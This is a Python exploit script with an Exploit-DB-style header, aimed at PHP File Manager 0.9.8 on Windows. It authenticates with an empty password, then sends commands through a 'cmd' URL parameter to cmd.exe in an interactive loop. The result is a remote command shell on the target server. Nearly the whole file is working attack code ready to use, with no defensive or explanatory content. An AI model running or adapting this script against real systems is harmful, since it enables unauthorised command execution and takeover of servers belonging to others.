import requests

# Exploit Title: PHP FILE MANAGER
# Date: 18th August 2019
# Exploit Author: C.McLean/Doctor_Hacker@twitter
# Version: 0.9.8
# Tested on: Windows

# Define target IP and port
TARGET_IP = '192.168.10.2'
TARGET_PORT = 80

# Create the base URL
base_url = f'http://{TARGET_IP}:{TARGET_PORT}/index.php'

# Create a new requests Session
session = requests.Session()

# Set POST payload
payload = {'frame': '3', 'pass': ''}

# Send POST request
response_post = session.post(base_url, data=payload)

# Update the URL with additional parameters
command_url = base_url + '?action=6&current_dir= C:/Users/Administrator/Desktop/USBWebserver%20v8_en /&cmd=c:\\Windows\\system32\\cmd.exe /c '

print(f"Command URL: {command_url}")

# Create a command shell
print("Type: 'exit' to break")
while True:
    # Get user input for command
    command = input(f'shell@{TARGET_IP}:~# ')
    
    # Append command to URL
    full_url = command_url + command
    
    # Send GET request with command and display response
    response_get = session.get(full_url)
    print(response_get.text)
    
    # Exit loop if user types 'exit'
    if command.strip().lower() == 'exit':
        break
